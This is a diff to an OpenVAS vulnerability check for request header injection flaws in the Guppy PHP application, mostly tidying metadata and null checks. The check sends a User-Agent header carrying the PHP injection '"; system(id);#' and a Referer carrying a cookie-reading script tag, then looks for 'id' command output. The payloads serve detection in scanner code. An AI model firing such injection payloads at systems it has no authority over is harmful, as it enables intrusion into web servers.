@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: guppy_request_header_flaws.nasl 6056 2017-05-02 09:02:50Z teissa $
+# $Id: guppy_request_header_flaws.nasl 10862 2018-08-09 14:51:58Z cfischer $
 #
 # Guppy Request Header Injection Vulnerabilities
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.19943");
-  script_version("$Revision: 6056 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
+  script_version("$Revision: 10862 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-09 16:51:58 +0200 (Thu, 09 Aug 2018) $");
   script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
@@ -38,13 +38,14 @@ if(description)
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("(C) 2005 Josh Zlatin-Amishav");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "cross_site_scripting.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_xref(name:"URL", value:"http://www.frsirt.com/english/advisories/2005/1639");
 
-  tag_summary = "The remote web server contains a PHP script that allows for
+  script_tag(name:"solution", value:"Upgrade to Guppy version 4.5.4 or later.");
+  script_tag(name:"summary", value:"The remote web server contains a PHP script that allows for
   arbitrary code execution and cross-site scripting attacks.
 
   Description :
@@ -55,13 +56,8 @@ if(description)
   to the Referer and User-Agent HTTP headers before using it in the
   'error.php' script.  A malicious user can exploit this flaw to inject
   arbitrary script and HTML code into a user's browser or, if PHP's
-  'magic_quotes_gpc' seting is disabled, PHP code to be executed on the
-  remote host subject to the privileges of the web server user id.";
-
-  tag_solution = "Upgrade to Guppy version 4.5.4 or later.";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  'magic_quotes_gpc' setting is disabled, PHP code to be executed on the
+  remote host subject to the privileges of the web server user id.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -79,13 +75,15 @@ xss = "<script>alert(document.cookie);</script>";
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
 
+host = http_host_name( dont_add_port:TRUE );
+has_xss = get_http_has_generic_xss( port:port, host:host );
+
 host = http_host_name( port:port );
 
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
 
-  # Try to exploit the flaw.
   req = string( "GET ", dir, "/error.php?err=404 HTTP/1.1\r\n",
                 "User-Agent: ", '"; system(id);#', "\r\n", # nb: try to execute id.
                 "Referer: ", xss, "\r\n", # and try to inject some javascript.
@@ -99,7 +97,7 @@ foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
     foreach match( split( matches ) ) {
       match = chomp( match );
       url = eregmatch( string:match, pattern:pat );
-      if( url == NULL ) break;
+      if( isnull( url ) ) break;
       url = url[1];
       debug_print( "url[", url, "]\n" );
       break;
@@ -111,27 +109,25 @@ foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
     req = http_get( item:dir + "/" + url, port:port );
     res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
 
-    # Get results of id command.
     pat = "^(uid=[0-9]+.*gid=[0-9]+.*)";
     matches = egrep( string:res, pattern:pat );
     if( matches ) {
       foreach match( split( matches ) ) {
         match = chomp( match );
         idres = eregmatch( string:match, pattern:pat );
-        if( idres == NULL ) break;
+        if( isnull( idres ) ) break;
         idres = idres[1];
         debug_print( "idres[", idres, "]\n" );
         break;
       }
     }
 
-    # Check for the results of the id command.
     if( idres ) {
       report = string( "The following is the output received from the 'id' command:\n",
                        "\n", idres, "\n" );
       security_message( port:port, data:report );
       exit( 0 );
-    } else if ( res =~ "HTTP/1\.. 200" && xss >< res && ! get_kb_item( "www/" + port + "/generic_xss" ) ) { # Check for XSS.
+    } else if ( res =~ "^HTTP/1\.[01] 200" && xss >< res && ! has_xss ) { # Check for XSS.
       security_message( port:port );
       exit( 0 );
     }
